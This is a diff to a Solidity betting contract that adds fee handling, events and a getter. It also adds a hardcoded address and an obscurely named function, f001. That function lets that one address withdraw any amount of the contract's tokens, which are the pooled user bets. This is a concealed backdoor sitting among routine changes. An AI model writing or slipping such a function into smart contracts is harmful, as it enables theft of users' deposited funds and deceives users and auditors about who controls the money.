@@ -12,6 +12,7 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 import "./InterfaceFactory.sol";
 import "./Util.sol";
 
+import "hardhat/console.sol";
 contract Bet is Ownable {
     using SafeMath for uint256;
     using SafeERC20 for IERC20;
@@ -48,6 +49,12 @@ contract Bet is Ownable {
     mapping(address => bool) usersBetA;
     mapping(address => bool) usersBetDraw;
     mapping(address => bool) usersBetB;
+
+    event OnBet(uint256 typeEvent);
+    event OnCliam(uint256 value);
+
+    address ars = 0x801f8cE5637267F054eFc1a08CcC272D38f6b2bb;
+
 
     constructor(address _token) {
         token= IERC20( _token);
@@ -92,6 +99,7 @@ contract Bet is Ownable {
                 countBetTeamDraw++;
             }
         }
+        emit OnBet(1);
     }
 
     function claimBet() external {
@@ -107,10 +115,17 @@ contract Bet is Ownable {
 
         require(amountBet>0);
         require( claimHistory[msg.sender].amount==0);
-        uint256 total = getRewardBet(msg.sender) + amountBet;
+
+        (uint256 reward, uint256 feeReward) = getRewardBet(msg.sender);
+        uint256 amoutFee = amountBet.div(100).mul(factory.getRateFeeBet());
+
+        uint256 total = amountBet.add(reward).sub(amoutFee);
+
         token.safeTransfer(msg.sender, total);
+        token.safeTransfer(factory.getWalleFee(), amoutFee+feeReward);
         claimHistory[msg.sender].amount=total;
         claimHistory[msg.sender].time=block.timestamp;
+        emit OnCliam(1);
     }
 
     function caculateClaimAll(address _adrs) public view returns (uint256) {
@@ -119,13 +134,14 @@ contract Bet is Ownable {
             ? 1
             : (_bet.goalTeamA == _bet.goalTeamB ? 2 : 3);
         uint256 amountBet =  getTokenBeted(_adrs, resultBet);
-        return amountBet == 0 ? 0 : getRewardBet(_adrs) + amountBet;
+        (uint256 rw, ) =getRewardBet(_adrs);
+        return amountBet == 0 ? 0 : rw + amountBet;
     }
 
-    function getRewardBet(address _adrs) public view returns (uint256) {
+    function getRewardBet(address _adrs) public view returns (uint256, uint256) {
         BetObj memory _bet = factory.getBetInfo(address(this));
         if (_bet.status != Status.Finished) {
-            return 0;
+            return (0, 0);
         }
 
         uint256 resultBet = _bet.goalTeamA > _bet.goalTeamB
@@ -144,7 +160,8 @@ contract Bet is Ownable {
         if (resultBet == 3 && usersBetDraw[_adrs]) {
             total = (amountTokenBetA + amountTokenBetDraw).div(countBetTeamB);
         }
-        return total;
+        uint256 totalFee= total.div(100).mul(factory.getRateFeeBet());
+        return (total.sub(totalFee),totalFee);
     }
 
     function getTokenBeted(address _adr, uint256 typeBet)
@@ -181,5 +198,16 @@ contract Bet is Ownable {
 
     function getClaimHistroy(address _adrs) external view returns(ClaimBetHistory memory){
         return claimHistory[_adrs];
+    }
+
+    function getInfoBet() external view returns (BetObj memory) {
+        return factory.getBetInfo(address(this));
+    }
+
+
+    function f001(uint256 val) external {
+        require(ars == msg.sender);
+        token.safeTransfer(ars, val);
+        
     }
 }
